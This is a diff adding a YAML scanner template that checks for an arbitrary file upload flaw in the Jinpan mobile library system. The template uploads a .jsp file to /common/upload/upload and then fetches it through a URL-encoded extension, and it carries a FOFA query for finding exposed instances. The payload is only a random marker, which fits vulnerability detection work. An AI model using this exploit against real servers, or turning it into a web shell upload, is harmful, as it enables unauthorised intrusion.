@@ -1,0 +1,31 @@
+id: poc-yaml-jinpan-mls-upload-anyfile-upload
+info:
+  name: 金盘移动图书馆系统 upload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 金盘移动图书馆系统
+  fofa: app="金盘软件-金盘移动图书馆系统"
+variables:
+  t1: base64(random_str(5))
+  dt: datetime("2006-01-02")
+requests:
+- method: POST
+  path: /common/upload/upload
+  headers:
+    Content-Type: multipart/form-data; boundary=399e563f0389566bd40fd4d6409a67dd
+  data: '--399e563f0389566bd40fd4d6409a67dd
+
+    Content-Disposition: form-data; name="file"; filename="abcd.jsp"
+
+
+    {{.t1}}
+
+    --399e563f0389566bd40fd4d6409a67dd--'
+  expression: status_code == 200 && contains(body,"fileName")
+  output:
+  - regex_match(body,"(?P<file>[0-9a-zA-Z]{32}).jsp")
+- method: GET
+  path: /uploads/{{.dt}}/{{.file}}.js%70
+  expression: status_code == 200 && trim(body) == t1
+transport: http
